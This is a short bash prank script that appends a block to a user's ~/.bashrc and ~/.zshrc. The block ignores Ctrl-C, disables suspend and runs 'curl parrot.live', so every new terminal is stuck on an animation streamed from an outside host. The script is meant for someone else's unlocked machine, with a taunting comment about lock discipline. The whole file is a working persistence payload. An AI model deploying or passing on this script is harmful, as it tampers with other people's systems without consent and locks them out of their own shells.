#!/bin/bash

PARROT_TROLL=$(cat << 'EOF'
#
# Gawk! Hey you security threat!
# Pay attention, lock your machine when you leave you silly simian! 
# Curl, the Parrot 🦜
# *** Pixelates and fades into cyberspace ***
#
trap '' 2
stty susp undef
curl parrot.live
EOF
)

append_parrot_troll() {
    local file="$1"
    if [ -f "$file" ]; then
        if ! grep -q "$PARROT_TROLL" "$file"; then
            echo "$PARROT_TROLL" >> "$file"
            echo "Parrot Troll 🦜 added to $file"
        fi
    fi
}

append_parrot_troll ~/.bashrc
append_parrot_troll ~/.zshrc
